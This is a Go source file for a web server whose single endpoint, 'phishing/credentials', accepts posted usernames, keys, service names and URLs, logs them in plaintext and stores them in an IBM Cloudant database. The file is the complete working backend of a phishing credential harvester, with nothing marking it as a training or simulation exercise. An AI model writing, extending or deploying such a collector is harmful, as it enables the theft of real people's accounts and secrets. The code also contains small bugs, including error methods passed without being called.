package main

import (
	"fmt"
	"github.com/labstack/echo"
	"github.com/IBM/cloudant-go-sdk/cloudantv1"
	"github.com/google/uuid"
	"encoding/json"
	"net/http"
	"os"
)

var (
	CLOUDANT_DB=os.Getenv("CLOUDANT_DB")
)

type Credentials struct {
	ID		string  `json:"id"`
	Username 	string	`json:"username"`
	Key		string	`json:"key"`
	Service		string	`json:"service"`
	Url		string	`json:"url"`
}

func StoreCredential(credential Credentials) error {
	fmt.Printf("> DB: %v\n", CLOUDANT_DB)
	credential.ID = fmt.Sprintf("credentials:%s", uuid.New().String())
	fmt.Printf("> ID: %v\n", credential.ID)
	client, err := cloudantv1.NewCloudantV1UsingExternalConfig(
		&cloudantv1.CloudantV1Options{},
	)
	if err != nil {
		return err
	}
	doc := cloudantv1.Document{
		ID: &credential.ID,
	}
	doc.SetProperty("username", credential.Username)
	doc.SetProperty("key", credential.Key)
	doc.SetProperty("service", credential.Service)
	doc.SetProperty("url", credential.Url)
	options := client.NewPostDocumentOptions(
		CLOUDANT_DB,
	).SetDocument(&doc)
	response, _, err := client.PostDocument(options)
	fmt.Printf("> Post Response: %v\n", response)
	return err
}

func SaveCredentials(c echo.Context) error {
	credential := Credentials{}
	defer c.Request().Body.Close()
	err := json.NewDecoder(c.Request().Body).Decode(&credential)
	if err != nil {
		fmt.Printf("Error reading credential:\n%v\n", err)
		return echo.NewHTTPError(http.StatusInternalServerError, err.Error)
	}
	fmt.Printf("Saving credential: \n%v\n", credential)
	err = StoreCredential(credential)
	if err != nil {
		fmt.Printf("Error storing credential:\n%v\n", err)
		return echo.NewHTTPError(http.StatusInternalServerError, err.Error)
	}
	return c.String(http.StatusOK, "{\"status\":\"ok\"}")
}


func main() {
	e := echo.New()
	e.POST("phishing/credentials", SaveCredentials)

	e.Logger.Fatal(e.Start(":80"))
}
